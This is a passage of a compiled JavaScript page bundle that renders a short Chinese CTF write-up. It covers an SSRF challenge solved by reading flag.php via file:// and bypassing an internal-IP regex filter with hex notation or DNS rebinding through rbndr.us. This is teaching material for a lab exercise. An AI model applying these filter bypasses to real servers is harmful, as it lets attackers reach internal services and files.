noreferrer"}},[s._v("DNS重绑定漏洞"),a("OutboundLink")],1),a("br"),s._v("\n使用file://协议查看flag.php查看代码发现过滤了"),a("code",[s._v("/127|172|10|192/")]),s._v("开头，可以用16进制方式绕过，但是考虑到题目要求使用DNS重绑定"),a("br"),s._v("\n使用"),a("a",{attrs:{href:"https://lock.cmpxchg8b.com/rebinder.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("rbndr.us dns rebinding service"),a("OutboundLink")],1),s._v("获取域名"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/dns1.png",alt:"dns1"}}),a("br"),s._v("\n访问或取flag"),a("br"),s._v(" "),a("img",{attrs:{src:"/assets/img/ctf/dns2.png",alt:"dns2"}})])])}),[],!1,null,null,null);t.default=r.exports}}]);